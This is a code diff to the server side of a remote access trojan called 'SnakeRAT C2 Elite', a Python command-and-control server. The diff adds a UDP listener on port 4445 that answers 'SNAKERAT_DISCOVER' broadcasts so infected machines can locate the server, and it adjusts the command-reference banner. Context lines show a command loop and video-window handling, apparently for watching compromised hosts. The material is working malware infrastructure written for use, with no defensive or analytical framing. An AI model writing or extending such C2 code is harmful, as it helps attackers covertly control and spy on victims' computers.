@@ -309,6 +309,7 @@ class AdvancedC2Server:
     def start(self):
         self.running = True
         threading.Thread(target=self._command_loop, daemon=True).start()
+        threading.Thread(target=self._discovery_responder, daemon=True).start()
         
         server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -399,6 +400,23 @@ class AdvancedC2Server:
         finally:
             if self._cv2_available:
                 self._cv2.destroyAllWindows()
+
+    def _discovery_responder(self):
+        """Listen for UDP discovery broadcasts and reply with server info."""
+        discovery_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        discovery_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        try:
+            discovery_sock.bind(('0.0.0.0', 4445)) # Use port 4445 for discovery
+            self.logger.info("Discovery responder active on UDP 4445")
+            while self.running:
+                data, addr = discovery_sock.recvfrom(1024)
+                if data == b"SNAKERAT_DISCOVER":
+                    self.logger.debug(f"Discovery request from {addr[0]}")
+                    discovery_sock.sendto(b"SNAKERAT_OFFER", addr)
+        except Exception as e:
+            self.logger.error(f"Discovery responder error: {e}")
+        finally:
+            discovery_sock.close()
 
 
 
@@ -1145,7 +1163,7 @@ class CommandParser:
         M  = Fore.MAGENTA
         R  = Fore.RED
         Bl = Fore.BLUE
-        print(f"""
+        print(fr"""
 {C}{'='*70}{W}
   SnakeRAT C2 Elite  |  Full Command Reference  |  type 'help' to reprint
 {C}{'='*70}{W}
